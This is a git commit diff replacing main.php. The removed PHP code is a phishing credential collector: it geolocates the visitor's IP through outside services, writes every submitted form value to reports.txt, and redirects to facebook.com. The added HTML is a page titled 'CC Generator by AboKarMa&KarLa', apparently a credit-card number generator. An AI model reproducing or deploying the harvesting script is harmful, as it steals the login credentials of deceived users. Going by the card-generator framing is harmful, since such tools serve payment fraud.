c76250ad6483d7b3a158d444af4900c438c535b3
KARMA2666 <122715431+KARMA2666@users.noreply.github.com>
2024-07-13 08:51:40 +0300

    Update main.php

--- main.php
+++ main.php
@@ -1,69 +1,19 @@
-<?php
+<!doctype html>
+<html lang="en">
 
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="description"
+        content="Best CC Generator for multiple BINS,  Generates Multiple Bins at once, CC Generator by AboKarMa&KarLa, AboKarMa&KarLa, AboKarMa&KarLa, AboKarMa&KarLa, AboKarMa&KarLa CC Generator" />
+    <link rel="shortcut icon" href="./favicon.ico" />
+    <title>CC Generator by AboKarMa&KarLa</title>
+    <script defer="defer" src="./static/js/main.50dd2123.js"></script>
+    <link href="./static/css/main.a75c7858.css" rel="stylesheet">
+</head>
 
-function getIp(){
-    $client  = @$_SERVER['HTTP_CLIENT_IP'];
-    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
-    $remote  = $_SERVER['REMOTE_ADDR'];
+<body><noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root"></div>
+</body>
 
-    if(filter_var($client, FILTER_VALIDATE_IP))
-    {
-        $ip = $client;
-    }
-    elseif(filter_var($forward, FILTER_VALIDATE_IP))
-    {
-        $ip = $forward;
-    }elseif ($remote == "::1") {
-		$ch = curl_init();
-		curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/?format=json');
-		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
-		$result = curl_exec($ch);
-		$splitor = explode(':', $result);
-		$result = $splitor[1];
-		$result = str_replace('"', "", $result);
-		$result = str_replace('}', "", $result);
-		$ip = $result;
-
-    }
-    else
-    {
-        $ip = $remote;
-    }
-
-    return $ip;
-}
-function GetData(){
-    $url = "http://www.geoplugin.net/json.gp?ip=".getIp();
-    $ch = curl_init();  
-    curl_setopt($ch,CURLOPT_URL,$url);
-    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    $resp=curl_exec($ch);
-    curl_close($ch);
-    $details = json_decode($resp, true);
-    //return $resp;
-    $country     = $details['geoplugin_countryName'];
-    $data = $country;
-    return $data;
-}
-$file = fopen("reports.txt","a");
-$ip=getIp();
-$country = GetData();
-
-
-$handle = fopen("reports.txt", "a");
-foreach($_POST as $variable => $value)
-{
-	fwrite($handle, $value.":");
-}
-
-fwrite($file,"$country");
-fclose($file);
-fwrite($handle, "\r\n");
-fclose($handle);
-
-
-header("location:https://www.facebook.com");
-
-?>
+</html>
